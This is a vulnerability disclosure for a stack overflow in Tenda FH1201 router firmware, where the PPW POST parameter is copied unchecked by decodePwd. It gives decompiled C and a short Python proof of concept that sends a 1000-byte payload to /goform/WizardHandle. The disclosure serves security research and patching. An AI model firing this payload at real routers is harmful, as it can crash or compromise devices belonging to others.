## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3322.html

## Affected version

FH1201 Firmware  V1.2.0.14(408)

## Vulnerability details

The Tenda FH1201 Firmware  V1.2.0.14(408) has a stack overflow vulnerability located in the `fromWizardHandle` function. This function accepts the `WANT`and `WANS` parameter from a POST request. Within `case 2`, this function accepts the `PPW` parameter from a POST request, which is assigned to `decodePwd(v22, v54);`. However, since the user has control over the input of `PPW`, the function `decodePwd()` leads to a buffer overflow. The user-supplied `PPW` can exceed the capacity of the `v54` array, thus triggering this security vulnerability.

![image-20240731141401641](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240731141401641.png)

```c
_BYTE *__fastcall decodePwd(_BYTE *a1, _BYTE *a2)
{
  _BYTE *result; // $v0
  _BYTE *v3; // [sp+8h] [+8h]
  _BYTE *v4; // [sp+Ch] [+Ch]

  v3 = a1;
  v4 = a2;
  result = a1;
  if ( a1 )
  {
    result = a2;
    if ( a2 )
    {
      while ( *v3 )
      {
        if ( *v3 == 92 )
          ++v3;
        *v4++ = *v3++;
      }
      result = v4;
      *v4 = 0;
    }
  }
  return result;
}
```

## POC

```python
import requests

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WizardHandle"
payload = b"a"*1000

data = {"WANS":"0","WANT":"2","PPW": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409102339559](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409102339559.png)